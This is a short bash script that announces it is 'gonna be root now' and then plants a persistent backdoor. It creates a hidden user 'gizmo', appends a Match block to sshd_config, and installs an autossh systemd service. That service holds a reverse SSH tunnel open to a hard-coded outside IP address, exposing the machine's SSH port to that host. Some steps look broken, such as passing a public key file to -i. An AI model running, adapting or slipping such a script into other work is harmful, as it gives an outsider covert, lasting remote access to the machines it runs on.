#!/bin/bash
echo 'Hey there bud, im gonna be root now, thanks.'
/bin/bash -i
sudo apt install -y autossh
echo 'Installing Autossh...'
sudo useradd -s /bin/true -m gizmo
echo 'Creating user'
sudo chown -R gizmo:gizmo ~gizmo/.ssh
echo 'Re-owning ssh configs...'
sudo chmod 700 ~gizmo/.ssh
sudo chmod 600 ~gizmo/.ssh/authorized_keys
echo 'Creating sshd_config...'
echo 'Match User gizmo 
GatewayPorts yes 
ForceCommand /bin/false 
ClientAliveInterval 30 
ClientAliveCountMax 3' >> /etc/ssh/sshd_config
echo 'Reloading ssh...'
sudo systemctl reload ssh
echo 'Making autossh service files...'
mkdir -p ~/.config/systemd/user

cat << EOF > ~/.config/systemd/user/autossh.service
[Unit]
Description=Autossh
Wants=network-online.target
After=network-online.target
StartLimitIntervalSec=0

[Service]
ExecStart=/usr/bin/autossh -M 0 -N \
	-o "ServerAliveInterval 15" -o "ServerAliveCountMax 3" -o "ConnectTimeout 10" -o "ExitOnForwardFailure yes" \
	-i /home/gizmo/.ssh/id_rsa.pub -p 1122 gizmo@75.138.184.49 \
	-R 10022:localhost:22
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
echo 'Enabling autossh service...'
systemctl --user enable --now autossh

